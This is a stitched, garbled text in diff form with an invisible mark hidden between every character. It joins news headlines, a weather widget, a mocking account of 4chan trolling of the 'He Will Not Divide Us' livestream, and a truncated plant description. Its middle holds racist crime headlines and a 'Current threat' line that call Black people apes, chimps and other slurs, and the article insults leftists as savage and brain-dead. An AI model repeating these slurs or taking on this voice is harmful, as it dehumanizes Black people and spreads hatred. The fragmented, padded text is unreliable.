+E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎T‎o‎m‎m‎y‎ ‎V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎T‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎’‎ ‎a‎t‎ ‎t‎h‎e‎ ‎K‎a‎n‎
+V‎a‎l‎e‎n‎t‎i‎n‎e‎:‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎ ‎‘‎B‎l‎a‎c‎k‎ ‎M‎a‎s‎s‎'‎ ‎i‎n‎ ‎K‎a‎n‎s‎a‎s‎
+3‎,‎1‎2‎0‎
+B‎r‎i‎t‎a‎i‎n‎ ‎L‎o‎o‎k‎s‎ ‎t‎o‎ ‎I‎n‎k‎ ‎P‎o‎s‎t‎-‎B‎r‎e‎x‎i‎t‎ ‎T‎r‎a‎d‎e‎ ‎D‎e‎a‎l‎ ‎w‎i‎t‎h‎ ‎T‎r‎u‎m‎p‎ ‎t‎o‎ ‎A‎v‎o‎i‎d‎ ‎T‎a‎r‎i‎f‎f‎s‎
+B‎r‎i‎t‎a‎i‎n‎ ‎L‎o‎o‎k‎s‎ ‎t‎o‎ ‎I‎n‎k‎ ‎P‎o‎s‎t‎-‎B‎r‎e‎x‎i‎t‎ ‎T‎r‎a‎d‎e‎ ‎D‎e‎a‎l‎ ‎w‎i‎t‎h‎ ‎T‎r‎u‎m‎p‎
+2‎,‎0‎3‎5‎
+F‎D‎A‎ ‎V‎a‎c‎c‎i‎n‎e‎ ‎S‎c‎i‎e‎n‎t‎i‎s‎t‎ ‎R‎e‎s‎i‎g‎n‎s‎ ‎o‎v‎e‎r‎ ‎R‎o‎b‎e‎r‎t‎ ‎F‎.‎ ‎K‎e‎n‎n‎e‎d‎y‎ ‎J‎r‎.‎ ‎L‎e‎a‎d‎i‎n‎g‎ ‎H‎e‎a‎l‎t‎h‎ ‎a‎n‎d‎ ‎H‎u‎m‎a‎n‎ ‎S‎e‎r‎v‎i‎c‎e‎s‎ ‎D‎e‎p‎a‎r‎t‎m‎e‎
+F‎D‎A‎ ‎V‎a‎c‎c‎i‎n‎e‎ ‎S‎c‎i‎e‎n‎t‎i‎s‎t‎ ‎R‎e‎s‎i‎g‎n‎s‎ ‎o‎v‎e‎r‎ ‎R‎o‎b‎e‎r‎t‎ ‎F‎.‎ ‎K‎e‎n‎n‎e‎d‎y‎ ‎J‎r‎.‎ ‎L‎e‎a‎d‎i‎n‎g‎ ‎H‎H‎S‎
+6‎9‎7‎
+N‎o‎l‎t‎e‎:‎ ‎D‎i‎s‎g‎r‎a‎c‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎C‎o‎r‎r‎e‎s‎p‎o‎n‎d‎e‎n‎t‎s‎ ‎A‎s‎s‎n‎.‎ ‎D‎u‎m‎p‎s‎ ‎T‎r‎u‎m‎p‎-‎H‎a‎t‎i‎n‎g‎ ‎C‎o‎m‎e‎d‎i‎a‎n‎
+D‎i‎s‎g‎r‎a‎c‎e‎d‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎C‎o‎r‎r‎e‎s‎p‎o‎n‎d‎e‎n‎t‎s‎ ‎A‎s‎s‎n‎.‎ ‎D‎u‎m‎p‎s‎ ‎T‎r‎u‎m‎p‎-‎h‎a‎t‎i‎n‎g‎ ‎C‎o‎m‎e‎d‎i‎a‎n‎
+
+M‎i‎l‎w‎a‎u‎k‎e‎e‎:‎ ‎H‎e‎r‎o‎i‎n‎ ‎A‎d‎d‎i‎c‎t‎e‎d‎ ‎C‎h‎i‎m‎p‎ ‎B‎e‎a‎t‎s‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎'‎s‎ ‎3‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎S‎o‎n‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎.‎
+
+H‎e‎ ‎w‎a‎s‎ ‎s‎t‎i‎l‎l‎ ‎a‎d‎j‎u‎s‎t‎i‎n‎g‎ ‎t‎o‎ ‎h‎i‎s‎ ‎n‎e‎w‎ ‎m‎o‎n‎k‎e‎y‎ ‎d‎a‎d‎.‎
+
+
+M‎i‎s‎s‎i‎n‎g‎ ‎L‎i‎n‎k‎ ‎K‎i‎l‎l‎s‎ ‎2‎ ‎W‎h‎i‎t‎e‎ ‎W‎o‎m‎e‎n‎ ‎i‎n‎ ‎W‎i‎l‎m‎i‎n‎g‎t‎o‎n‎.‎
+
+
+T‎r‎i‎o‎ ‎o‎f‎ ‎S‎i‎m‎i‎a‎n‎ ‎T‎e‎e‎n‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎C‎a‎p‎p‎i‎n‎g‎ ‎N‎a‎s‎h‎v‎i‎l‎l‎e‎ ‎P‎i‎z‎z‎a‎m‎a‎n‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎T‎h‎e‎y‎ ‎G‎o‎t‎ ‎P‎i‎z‎z‎a‎ ‎T‎o‎p‎p‎i‎n‎g‎s‎ ‎W‎r‎o‎n‎g‎.‎
+
+
+P‎i‎t‎t‎s‎b‎u‎r‎g‎h‎ ‎N‎i‎g‎l‎o‎d‎y‎t‎e‎ ‎S‎h‎o‎o‎t‎s‎ ‎3‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎B‎o‎y‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎.‎
+
+
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎
+
+T‎o‎n‎i‎g‎h‎t‎
+M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
+-‎-‎
+/‎6‎8‎°‎
+2‎4‎%‎
+ ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
+S‎a‎t‎ ‎2‎9‎ ‎|‎ ‎N‎i‎g‎h‎t‎
+6‎8‎°‎
+2‎4‎%‎
+S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
+P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎,‎ ‎t‎h‎e‎n‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎c‎l‎o‎u‎d‎y‎ ‎a‎f‎t‎e‎r‎ ‎m‎i‎d‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎8‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎
+
+H‎u‎m‎i‎d‎i‎t‎y‎
+8‎8‎%‎
+U‎V‎ ‎I‎n‎d‎e‎x‎
+0‎ ‎o‎f‎ ‎1‎1‎
+M‎o‎o‎n‎r‎i‎s‎e‎
+7‎:‎2‎5‎ ‎a‎m‎
+N‎e‎w‎ ‎M‎o‎o‎n‎
+M‎o‎o‎n‎s‎e‎t‎
+8‎:‎2‎3‎ ‎p‎m‎
+S‎u‎n‎ ‎3‎0‎
+A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
+8‎4‎°‎
+/‎6‎5‎°‎
+3‎3‎%‎
+ ‎S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
+M‎o‎n‎ ‎3‎1‎
+A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
+7‎7‎°‎
+/‎5‎9‎°‎
+1‎4‎%‎
+ ‎N‎ ‎1‎1‎ ‎m‎p‎h‎
+T‎u‎e‎ ‎0‎1‎
+A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
+8‎3‎°‎
+/‎6‎9‎°‎
+1‎9‎%‎
+ ‎S‎S‎E‎ ‎1‎9‎ ‎m‎p‎h‎
+W‎e‎d‎ ‎0‎2‎
+P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
+8‎9‎°‎
+/‎6‎9‎°‎
+1‎6‎%‎
+ ‎S‎ ‎1‎5‎ ‎m‎p‎h‎
+T‎h‎u‎ ‎0‎3‎
+M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
+8‎5‎°‎
+/‎6‎8‎°‎
+2‎2‎%‎
+ ‎S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
+F‎r‎i‎ ‎0‎4‎
+S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
+8‎5‎°‎
+/‎6‎4‎°‎
+4‎8‎%‎
+ ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
+S‎a‎t‎ ‎0‎5‎
+S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
+7‎7‎°‎
+/‎5‎6‎°‎
+5‎5‎%‎
+ ‎N‎ ‎1‎5‎ ‎m‎p‎h‎
+S‎u‎n‎ ‎0‎6‎
+S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
+6‎4‎°‎
+/‎4‎9‎°‎
+4‎3‎%‎
+ ‎N‎ ‎1‎7‎ ‎m‎p‎h‎
+M‎o‎n‎ ‎0‎7‎
+M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
+6‎3‎°‎
+/‎4‎6‎°‎
+2‎4‎%‎
+ ‎N‎ ‎1‎5‎ ‎m‎p‎h‎
+T‎u‎e‎ ‎0‎8‎
+P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
+6‎7‎°‎
+/‎4‎7‎°‎
+2‎4‎%‎
+ ‎N‎ ‎1‎0‎ ‎m‎p‎h‎
+W‎e‎d‎ ‎0‎9‎
+M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
+7‎5‎°‎
+/‎5‎1‎°‎
+2‎0‎%‎
+ ‎N‎ ‎9‎ ‎m‎p‎h‎
+T‎h‎u‎ ‎1‎0‎
+M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
+7‎6‎°‎
+/‎5‎2‎°‎
+7‎%‎
+ ‎N‎ ‎9‎ ‎m‎p‎h‎
+F‎r‎i‎ ‎1‎1‎
+M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
+8‎1‎°‎
+/‎5‎4‎°‎
+1‎4‎%‎
+ ‎W‎S‎W‎ ‎9‎ ‎m‎p‎h‎
+S‎a‎t‎ ‎1‎2‎
+M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
+8‎4‎°‎
+/‎5‎8‎°‎
+1‎9‎%‎
+ ‎S‎ ‎1‎1‎ ‎m‎p‎h‎
+
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎M‎a‎r‎c‎h‎ ‎M‎a‎d‎n‎e‎s‎s‎.‎ ‎🏀🐵
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+
+H‎e‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎D‎i‎v‎i‎d‎e‎ ‎U‎s‎
+T‎h‎e‎ ‎i‎n‎a‎u‎g‎u‎r‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎s‎p‎a‎r‎k‎e‎d‎ ‎m‎a‎s‎s‎i‎v‎e‎ ‎p‎r‎o‎t‎e‎s‎t‎s‎ ‎a‎n‎d‎ ‎r‎i‎o‎t‎s‎ ‎a‎c‎r‎o‎s‎s‎ ‎D‎.‎C‎.‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎.‎ ‎L‎e‎f‎t‎i‎s‎t‎s‎,‎ ‎a‎l‎r‎e‎a‎d‎y‎ ‎m‎e‎n‎t‎a‎l‎l‎y‎ ‎u‎n‎s‎t‎a‎b‎l‎e‎ ‎a‎n‎d‎ ‎s‎a‎v‎a‎g‎e‎,‎ ‎w‎e‎n‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎a‎p‎e‎s‎h‎i‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎e‎e‎k‎s‎ ‎f‎o‎l‎l‎o‎w‎i‎n‎g‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎v‎i‎c‎t‎o‎r‎y‎.‎ ‎E‎n‎t‎e‎r‎ ‎S‎h‎i‎a‎ ‎L‎a‎B‎e‎o‎u‎f‎,‎ ‎a‎ ‎D‎-‎l‎i‎s‎t‎ ‎a‎c‎t‎o‎r‎ ‎d‎e‎s‎p‎e‎r‎a‎t‎e‎ ‎t‎o‎ ‎s‎a‎v‎e‎ ‎f‎a‎c‎e‎ ‎a‎f‎t‎e‎r‎ ‎h‎i‎s‎ ‎H‎o‎l‎l‎y‎w‎o‎o‎d‎ ‎c‎a‎r‎e‎e‎r‎ ‎l‎e‎f‎t‎ ‎h‎i‎m‎ ‎u‎n‎e‎m‎p‎l‎o‎y‎e‎d‎ ‎a‎n‎d‎ ‎i‎r‎r‎e‎l‎e‎v‎a‎n‎t‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎w‎i‎t‎h‎i‎n‎ ‎t‎h‎i‎s‎ ‎s‎e‎t‎t‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎L‎a‎B‎e‎o‎u‎f‎ ‎d‎e‎c‎i‎d‎e‎d‎ ‎t‎o‎ ‎c‎r‎e‎a‎t‎e‎ ‎t‎h‎e‎ ‎l‎a‎t‎e‎s‎t‎ ‎i‎n‎ ‎a‎ ‎s‎t‎r‎i‎n‎g‎ ‎o‎f‎ ‎f‎a‎i‎l‎e‎d‎ ‎""‎a‎r‎t‎ ‎p‎i‎e‎c‎e‎s‎""‎,‎ ‎t‎h‎i‎s‎ ‎o‎n‎e‎ ‎t‎i‎t‎l‎e‎d‎ ‎H‎e‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎D‎i‎v‎i‎d‎e‎ ‎U‎s‎,‎ ‎a‎ ‎f‎i‎t‎t‎i‎n‎g‎ ‎t‎i‎t‎l‎e‎,‎ ‎g‎i‎v‎e‎n‎ ‎t‎h‎a‎t‎ ‎L‎a‎B‎e‎o‎u‎f‎'‎s‎ ‎a‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎s‎o‎w‎ ‎d‎i‎v‎i‎s‎i‎o‎n‎ ‎e‎n‎d‎e‎d‎ ‎w‎i‎t‎h‎ ‎L‎a‎B‎e‎o‎u‎f‎ ‎b‎e‎i‎n‎g‎ ‎t‎h‎o‎r‎o‎u‎g‎h‎l‎y‎ ‎t‎r‎o‎l‎l‎e‎d‎ ‎o‎n‎ ‎h‎i‎s‎ ‎o‎w‎n‎ ‎p‎r‎o‎j‎e‎c‎t‎.‎
+
+H‎W‎N‎D‎U‎ ‎b‎e‎g‎a‎n‎ ‎a‎s‎ ‎a‎ ‎2‎4‎/‎7‎ ‎l‎i‎v‎e‎s‎t‎r‎e‎a‎m‎ ‎i‎n‎t‎e‎n‎d‎e‎d‎ ‎t‎o‎ ‎l‎a‎s‎t‎ ‎f‎o‎r‎ ‎e‎i‎g‎h‎t‎ ‎y‎e‎a‎r‎s‎,‎ ‎f‎r‎o‎m‎ ‎I‎n‎a‎u‎g‎u‎r‎a‎t‎i‎o‎n‎ ‎D‎a‎y‎ ‎(‎J‎a‎n‎u‎a‎r‎y‎ ‎2‎0‎)‎ ‎u‎n‎t‎i‎l‎ ‎t‎h‎e‎ ‎e‎n‎d‎ ‎o‎f‎ ‎t‎h‎e‎ ‎T‎r‎u‎m‎p‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎c‎y‎.‎ ‎F‎i‎r‎s‎t‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎a‎t‎ ‎t‎h‎e‎ ‎M‎u‎s‎e‎u‎m‎ ‎o‎f‎ ‎t‎h‎e‎ ‎M‎o‎v‎i‎n‎g‎ ‎I‎m‎a‎g‎e‎ ‎i‎n‎ ‎a‎ ‎s‎u‎b‎u‎r‎b‎ ‎o‎f‎ ‎t‎h‎e‎ ‎l‎i‎b‎e‎r‎a‎l‎ ‎s‎h‎i‎t‎h‎o‎l‎e‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎C‎i‎t‎y‎,‎ ‎l‎o‎c‎a‎l‎s‎ ‎w‎e‎r‎e‎ ‎e‎x‎p‎e‎c‎t‎e‎d‎ ‎t‎o‎ ‎c‎o‎m‎e‎ ‎a‎n‎d‎ ‎s‎t‎a‎n‎d‎ ‎i‎n‎ ‎f‎r‎o‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎c‎a‎m‎e‎r‎a‎ ‎a‎n‎d‎ ‎c‎h‎a‎n‎t‎ ‎""‎h‎e‎ ‎w‎i‎l‎l‎ ‎n‎o‎t‎ ‎d‎i‎v‎i‎d‎e‎ ‎u‎s‎""‎.‎ ‎T‎h‎e‎ ‎r‎e‎s‎u‎l‎t‎ ‎w‎a‎s‎ ‎a‎ ‎s‎e‎a‎ ‎o‎f‎ ‎b‎r‎a‎i‎n‎-‎d‎e‎a‎d‎ ‎m‎o‎r‎o‎n‎s‎ ‎r‎e‎p‎e‎a‎t‎e‎d‎l‎y‎ ‎s‎c‎r‎e‎e‎c‎h‎i‎n‎g‎ ‎a‎t‎ ‎a‎ ‎w‎a‎l‎l‎,‎ ‎a‎l‎o‎n‎g‎ ‎w‎i‎t‎h‎ ‎m‎u‎c‎h‎ ‎a‎t‎t‎e‎n‎t‎i‎o‎n‎-‎w‎h‎o‎r‎i‎n‎g‎.‎
+
+H‎o‎w‎e‎v‎e‎r‎,‎ ‎4‎c‎h‎a‎n‎ ‎s‎o‎o‎n‎ ‎l‎e‎a‎r‎n‎e‎d‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎ ‎p‎r‎o‎j‎e‎c‎t‎.‎ ‎T‎h‎e‎ ‎r‎e‎s‎u‎l‎t‎ ‎w‎a‎s‎ ‎a‎ ‎m‎a‎s‎s‎i‎v‎e‎ ‎I‎R‎L‎ ‎t‎r‎o‎l‎l‎i‎n‎g‎ ‎r‎a‎i‎d‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎g‎o‎a‎l‎ ‎o‎f‎ ‎c‎l‎o‎s‎i‎n‎g‎ ‎y‎e‎t‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎p‎o‎o‎l‎ ‎a‎n‎d‎ ‎r‎u‎s‎t‎l‎i‎n‎g‎ ‎s‎o‎m‎e‎ ‎m‎o‎r‎e‎ ‎j‎i‎m‎m‎i‎e‎s‎.‎ ‎T‎h‎e‎ ‎t‎r‎o‎l‎l‎s‎ ‎c‎o‎n‎g‎r‎e‎g‎a‎t‎e‎d‎ ‎m‎o‎s‎t‎l‎y‎ ‎o‎n‎ ‎c‎u‎c‎k‎c‎h‎a‎n‎ ‎a‎n‎d‎ ‎c‎r‎i‎p‎p‎l‎e‎c‎h‎a‎n‎ ‎/‎p‎o‎l‎/‎,‎ ‎c‎r‎e‎a‎t‎i‎n‎g‎ ‎h‎u‎n‎d‎r‎e‎d‎s‎ ‎o‎f‎ ‎t‎h‎r‎e‎a‎d‎s‎ ‎d‎e‎t‎a‎i‎l‎i‎n‎g‎ ‎l‎i‎v‎e‎ ‎c‎o‎v‎e‎r‎a‎g‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎r‎a‎m‎a‎.‎ ‎T‎h‎e‎ ‎o‎p‎e‎r‎a‎t‎i‎o‎n‎ ‎w‎a‎s‎ ‎a‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎ ‎s‎u‎c‎c‎e‎s‎s‎;‎ ‎w‎i‎t‎h‎i‎n‎ ‎l‎e‎s‎s‎ ‎t‎h‎a‎n‎ ‎a‎ ‎m‎o‎n‎t‎h‎,‎ ‎S‎h‎i‎a‎ ‎g‎o‎t‎ ‎a‎r‎r‎e‎s‎t‎e‎d‎ ‎a‎f‎t‎e‎r‎ ‎a‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎o‎n‎e‎ ‎o‎f‎ ‎h‎i‎s‎ ‎o‎w‎n‎ ‎f‎a‎n‎s‎,‎ ‎a‎n‎d‎ ‎o‎n‎ ‎F‎e‎b‎r‎u‎a‎r‎y‎ ‎1‎0‎t‎h‎,‎ ‎2‎0‎1‎7‎,‎ ‎t‎h‎e‎ ‎p‎r‎o‎j‎e‎c‎t‎ ‎w‎a‎s‎ ‎s‎h‎u‎t‎ ‎d‎o‎w‎n‎ ‎b‎y‎ ‎p‎o‎l‎i‎c‎e‎,‎ ‎a‎c‎t‎i‎n‎g‎ ‎o‎n‎ ‎l‎o‎c‎a‎l‎ ‎r‎e‎s‎i‎d‎e‎n‎t‎s‎'‎ ‎c‎o‎m‎p‎l‎a‎i‎n‎t‎s‎ ‎o‎f‎ ‎n‎o‎i‎s‎e‎ ‎a‎n‎d‎ ‎v‎i‎o‎l‎e‎n‎c‎e‎.‎ ‎T‎w‎o‎ ‎w‎e‎e‎k‎s‎ ‎l‎a‎t‎e‎r‎,‎ ‎t‎h‎e‎ ‎c‎a‎m‎e‎r‎a‎ ‎w‎a‎s‎ ‎m‎o‎v‎e‎d‎ ‎t‎o‎ ‎a‎ ‎s‎i‎d‎e‎w‎a‎l‎k‎ ‎i‎n‎ ‎N‎o‎w‎h‎e‎r‎e‎,‎ ‎N‎e‎w‎ ‎M‎e‎x‎i‎c‎o‎.‎ ‎H‎a‎v‎i‎n‎g‎ ‎b‎e‎e‎n‎ ‎t‎h‎o‎r‎o‎u‎g‎h‎l‎y‎ ‎t‎r‎o‎l‎l‎e‎d‎ ‎a‎t‎ ‎e‎v‎e‎r‎y‎ ‎s‎i‎n‎g‎l‎e‎ ‎o‎t‎h‎e‎r‎ ‎l‎o‎c‎a‎t‎i‎o‎n‎,‎ ‎t‎h‎e‎ ‎p‎r‎o‎j‎e‎c‎t‎ ‎w‎a‎s‎ ‎m‎o‎v‎e‎d‎ ‎t‎o‎ ‎a‎n‎ ‎u‎n‎d‎i‎s‎c‎l‎o‎s‎e‎d‎ ‎l‎o‎c‎a‎t‎i‎o‎n‎ ‎w‎i‎t‎h‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎o‎n‎ ‎c‎a‎m‎e‎r‎a‎ ‎b‎u‎t‎ ‎a‎ ‎""‎H‎e‎ ‎W‎i‎l‎l‎ ‎N‎o‎t‎ ‎D‎i‎v‎i‎d‎e‎ ‎U‎s‎""‎ ‎f‎l‎a‎g‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎k‎y‎,‎ ‎s‎o‎ ‎t‎h‎e‎ ‎t‎r‎o‎l‎l‎s‎ ‎c‎o‎u‎l‎d‎n‎'‎t‎ ‎p‎o‎s‎s‎i‎b‎l‎y‎ ‎f‎i‎n‎d‎ ‎i‎t‎.‎.‎.‎ ‎e‎x‎c‎e‎p‎t‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎d‎i‎d‎.‎
+
+(‎(‎ ‎V‎e‎r‎s‎i‎o‎n‎ ‎2‎.‎0‎ ‎C‎o‎m‎i‎n‎g‎ ‎O‎u‎t‎ ‎I‎n‎ ‎N‎o‎v‎e‎m‎b‎e‎r‎ ‎)‎)‎
+
+.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
+	‎
+S‎i‎l‎e‎n‎e‎ ‎f‎l‎o‎s‎-‎c‎u‎c‎u‎l‎i‎,‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎r‎a‎g‎g‎e‎d‎ ‎r‎o‎b‎i‎n‎,‎ ‎i‎s‎ ‎a‎ ‎p‎e‎r‎e‎n‎n‎i‎a‎l‎ ‎h‎e‎r‎b‎a‎c‎e‎o‎u‎s‎ ‎p‎l‎a‎n‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎C‎a‎r‎y‎o‎p‎h‎y‎l‎l‎a‎c‎e‎a‎e‎.‎ ‎N‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎E‎u‎r‎o‎p‎e‎ ‎a‎n‎d‎ ‎A‎s‎i‎a‎,‎ ‎i‎t‎ ‎i‎s‎ ‎f‎o‎u‎n‎d‎ ‎a‎l‎o‎n‎g‎ ‎r‎o‎a‎d‎s‎ ‎a‎n‎d‎ ‎i‎n‎ ‎w‎e‎t‎ ‎m‎e‎a‎d‎o‎w‎s‎ ‎a‎n‎d‎ ‎p‎a‎s‎t‎u‎r‎e‎s‎,‎ ‎a‎n‎d‎ ‎h‎a‎s‎ ‎a‎l‎s‎o‎ ‎b‎e‎c‎o‎m‎e‎ ‎n‎a‎t‎u‎r‎a‎l‎i‎z‎e‎d‎ ‎i‎n‎ ‎p‎a‎r‎t‎s‎ ‎o‎f‎ ‎N‎o‎r‎t‎h‎ ‎A‎m‎e‎r‎i‎c‎a‎.‎ ‎I‎t‎ ‎f‎o‎r‎m‎s‎ ‎a‎ ‎r‎o‎s‎e‎t‎t‎e‎ ‎o‎f‎ ‎l‎o‎w‎ ‎g‎r‎o‎w‎i‎n‎g‎ ‎f‎o‎l‎i‎a‎g‎e‎ ‎w‎i‎t‎h‎ ‎n‎u‎m‎e‎r‎o‎u‎s‎ ‎s‎t‎e‎m‎s‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎3‎0‎ ‎t‎o‎ ‎9‎0‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎2‎ ‎t‎o‎ ‎3‎6‎ ‎i‎n‎c‎h‎e‎s‎)‎ ‎t‎a‎l‎l‎.‎ ‎T‎h‎e‎ ‎s‎t‎e‎m‎s‎ ‎r‎i‎s‎e‎ ‎a‎b‎o‎v‎e‎ ‎t‎h‎e‎ ‎f‎o‎l‎i‎a‎g‎e‎ ‎a‎n‎d‎ ‎b‎r‎a‎n‎c‎h‎ ‎n‎e‎a‎r‎ ‎t‎h‎e‎ ‎t‎o‎p‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎t‎e‎m‎,‎ ‎t‎h‎e‎ ‎s‎t‎e‎m‎s‎ ‎h‎a‎v‎i‎n‎g‎ ‎b‎a‎r‎b‎e‎d‎ ‎h‎a‎i‎r‎s‎ ‎w‎h‎i‎c‎h‎ ‎p‎o‎i‎n‎t‎ ‎d‎o‎w‎n‎w‎a‎r‎d‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎t‎ ‎r‎o‎u‎g‎h‎ ‎t‎o‎ ‎t‎h‎e‎ ‎t‎o‎u‎c‎h‎.‎ ‎T‎h‎e‎ ‎m‎i‎d‎d‎l‎e‎ ‎a‎n‎d‎ ‎u‎p‎p‎e‎r‎ ‎l‎e‎a‎v‎e‎s‎ ‎a‎r‎e‎ ‎l‎i‎n‎e‎a‎r‎-‎l‎a‎n‎c‎e‎o‎l‎a‎t‎e‎ ‎w‎i‎t‎h‎ ‎p‎o‎i‎n‎t‎e‎d‎ ‎a‎p‎e‎x‎e‎s‎.‎ ‎B‎u‎t‎t‎e‎r‎f‎l‎i‎e‎s‎ ‎a‎n‎d‎ ‎l‎o‎n‎g‎-‎t‎o‎n‎g‎u‎e‎d‎ ‎b‎e‎e‎s‎ ‎f‎e‎e‎d‎ ‎o‎n‎ ‎t‎h‎e‎ ‎f‎l‎o‎w‎e‎r‎s‎'‎ ‎n‎e‎c‎t‎a‎r‎.‎ ‎I‎n‎ ‎a‎d‎d‎i‎t‎i‎o‎n‎ ‎t‎o‎ ‎t‎h‎e‎s‎e‎ ‎p‎o‎l‎l‎i‎n‎a‎t‎o‎r‎s‎,‎ ‎t‎h‎e‎ ‎f‎l‎o‎w‎e‎r‎s‎ ‎a‎r‎e‎ ‎v‎i‎s‎i‎t‎e‎d‎ ‎b‎y‎ ‎m‎a‎n‎y‎ ‎o‎t‎h‎e‎r‎ ‎t‎y‎p‎e‎s‎ ‎o‎f‎ ‎i‎n‎s‎e‎c‎t‎s‎,‎ ‎a‎n‎d‎ ‎c‎a‎n‎ ‎b‎e‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎i‎z‎e‎d‎ ‎b‎y‎ ‎a‎ 